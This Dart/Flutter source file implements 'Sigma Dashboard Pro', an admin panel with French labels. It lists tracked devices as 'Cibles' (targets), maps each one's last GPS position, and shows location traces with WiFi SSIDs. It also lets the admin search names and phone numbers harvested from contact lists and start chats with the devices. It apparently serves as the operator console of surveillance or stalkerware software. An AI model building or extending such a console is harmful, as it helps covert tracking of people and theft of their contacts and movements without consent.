import 'package:flutter/material.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart' hide Path; 
import 'package:provider/provider.dart';

import '../../data/sources/supabase_service.dart';
import '../../data/sources/user_data_service.dart';
import 'messenger_screen.dart';

/// AdminScreen : Gestionnaire central de la flotte Sigma.
class AdminScreen extends StatefulWidget {
  const AdminScreen({super.key});

  @override
  State<AdminScreen> createState() => _AdminScreenState();
}

class _AdminScreenState extends State<AdminScreen> with SingleTickerProviderStateMixin {
  late TabController _tabController;
  final SupabaseService _supabase = SupabaseService();
  late Future<List<Map<String, dynamic>>> _usersFuture;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 5, vsync: this);
    _usersFuture = _supabase.fetchUniqueUsers();
  }

  void _refreshData() {
    setState(() {
      _usersFuture = _supabase.fetchUniqueUsers();
    });
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Sigma Dashboard Pro', style: TextStyle(fontWeight: FontWeight.bold)),
        actions: [
          IconButton(icon: const Icon(Icons.refresh), onPressed: _refreshData),
        ],
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'Stats'),
            Tab(icon: Icon(Icons.people), text: 'Cibles'),
            Tab(icon: Icon(Icons.map), text: 'Carte'),
            Tab(icon: Icon(Icons.location_history), text: 'Traces'),
            Tab(icon: Icon(Icons.contacts), text: 'Contacts'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _DashboardSummary(supabase: _supabase),
          _UserList(usersFuture: _usersFuture),
          _AdminMapView(supabase: _supabase),
          _DataList(fetcher: _supabase.fetchUserActivity, type: 'activity'),
          _DataList(fetcher: _supabase.fetchContacts, type: 'contacts', showSearch: true),
        ],
      ),
    );
  }
}

class _AdminMapView extends StatelessWidget {
  final SupabaseService supabase;
  const _AdminMapView({required this.supabase});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: supabase.fetchUsersWithLocation(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        
        final users = snapshot.data!;
        final markers = users.where((u) => (u['user_activity'] as List).isNotEmpty).map((user) {
          final lastPos = (user['user_activity'] as List).first;
          final String pseudo = user['pseudo'] ?? user['device_id'].toString().substring(0, 8);
          final point = LatLng(lastPos['latitude'] as double, lastPos['longitude'] as double);

          return Marker(
            point: point,
            width: 120,
            height: 85,
            alignment: Alignment.bottomCenter,
            child: GestureDetector(
              onTap: () => _showUserSheet(context, user),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                    decoration: BoxDecoration(
                      color: Colors.deepPurple,
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: const [BoxShadow(color: Colors.black26, blurRadius: 4, offset: Offset(0, 2))],
                    ),
                    child: Text(
                      pseudo,
                      style: const TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  Transform.translate(
                    offset: const Offset(0, -1),
                    child: CustomPaint(
                      size: const Size(12, 6),
                      painter: _TrianglePainter(Colors.deepPurple),
                    ),
                  ),
                  const Icon(Icons.location_on_rounded, color: Colors.red, size: 36),
                ],
              ),
            ),
          );
        }).toList();

        return FlutterMap(
          options: MapOptions(
            initialCenter: markers.isNotEmpty ? markers.first.point : const LatLng(36.75, 3.05),
            initialZoom: 6,
          ),
          children: [
            TileLayer(
              urlTemplate: 'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png',
              subdomains: const ['a', 'b', 'c', 'd'],
            ),
            MarkerLayer(markers: markers),
          ],
        );
      },
    );
  }

  void _showUserSheet(BuildContext context, Map<String, dynamic> user) {
    showModalBottomSheet(
      context: context,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (context) => Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(user['pseudo'] ?? "Anonyme", style: const TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
            const SizedBox(height: 8),
            Text("Modèle: ${user['model'] ?? 'Inconnu'}", style: const TextStyle(color: Colors.grey)),
            const Divider(height: 32),
            SizedBox(
              width: double.infinity,
              height: 50,
              child: FilledButton.icon(
                onPressed: () {
                  Navigator.pop(context);
                  Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: user['pseudo'] ?? user['device_id'].substring(0,8))));
                },
                icon: const Icon(Icons.chat_bubble),
                label: const Text("Démarrer un chat Sigma"),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _TrianglePainter extends CustomPainter {
  final Color color;
  _TrianglePainter(this.color);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..style = PaintingStyle.fill
      ..isAntiAlias = true;

    final path = Path();
    path.moveTo(0, 0);
    path.lineTo(size.width, 0);
    path.lineTo(size.width / 2, size.height);
    path.close();

    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class _DashboardSummary extends StatelessWidget {
  final SupabaseService supabase;
  const _DashboardSummary({required this.supabase});
  @override
  Widget build(BuildContext context) {
    return FutureBuilder<Map<String, int>>(
      future: supabase.fetchStats(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final stats = snapshot.data!;
        return GridView.count(
          crossAxisCount: 2,
          padding: const EdgeInsets.all(16),
          children: [
            _statCard("WiFi", stats['wifi']!, Icons.wifi, Colors.blue),
            _statCard("GPS", stats['activity']!, Icons.my_location, Colors.orange),
            _statCard("Contacts", stats['contacts']!, Icons.contacts, Colors.green),
            _statCard("Messages", stats['messages']!, Icons.message, Colors.purple),
          ],
        );
      },
    );
  }
  Widget _statCard(String label, int val, IconData icon, Color color) {
    return Card(
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Icon(icon, color: color, size: 32),
        Text(val.toString(), style: const TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
        Text(label, style: const TextStyle(fontSize: 12)),
      ]),
    );
  }
}

class _UserList extends StatelessWidget {
  final Future<List<Map<String, dynamic>>> usersFuture;
  const _UserList({required this.usersFuture});

  @override
  Widget build(BuildContext context) {
    final currentUserId = context.read<UserDataService>().deviceId;
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: usersFuture,
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final users = snapshot.data!.where((u) => u['device_id'] != currentUserId).toList();
        return ListView.builder(
          itemCount: users.length,
          itemBuilder: (context, index) {
            final user = users[index];
            final String pseudo = user['pseudo'] ?? user['device_id'].substring(0, 8);
            return ListTile(
              leading: const CircleAvatar(child: Icon(Icons.person)),
              title: Text(pseudo),
              subtitle: Text(user['model'] ?? ""),
              trailing: IconButton(
                icon: const Icon(Icons.chat, color: Colors.orange),
                onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: pseudo))),
              ),
            );
          },
        );
      },
    );
  }
}

class _DataList extends StatefulWidget {
  final Future<List<Map<String, dynamic>>> Function(int, {String? query}) fetcher;
  final String type;
  final bool showSearch;
  const _DataList({required this.fetcher, required this.type, this.showSearch = false});
  @override
  State<_DataList> createState() => _DataListState();
}

class _DataListState extends State<_DataList> {
  final List<Map<String, dynamic>> _items = [];
  String _query = "";
  bool _loading = false;
  int _offset = 0;
  @override
  void initState() { super.initState(); _loadMore(reset: true); }
  Future<void> _loadMore({bool reset = false}) async {
    if (_loading) return;
    if (reset) { _items.clear(); _offset = 0; }
    setState(() => _loading = true);
    final data = await widget.fetcher(_offset, query: _query);
    if (mounted) setState(() { _items.addAll(data); _offset += data.length; _loading = false; });
  }
  @override
  Widget build(BuildContext context) {
    return Column(children: [
      if (widget.showSearch) Padding(padding: const EdgeInsets.all(8), child: TextField(decoration: const InputDecoration(hintText: "Rechercher...", prefixIcon: Icon(Icons.search)), onChanged: (v) { _query = v; _loadMore(reset: true); })),
      Expanded(child: ListView.builder(itemCount: _items.length, itemBuilder: (context, index) {
        final item = _items[index];
        return ListTile(
          title: Text(widget.type == 'contacts' ? item['name'] : (item['ssid'] ?? "Trace")),
          subtitle: Text(widget.type == 'contacts' ? item['phone'] : (item['timestamp'] ?? "")),
        );
      })),
    ]);
  }
}
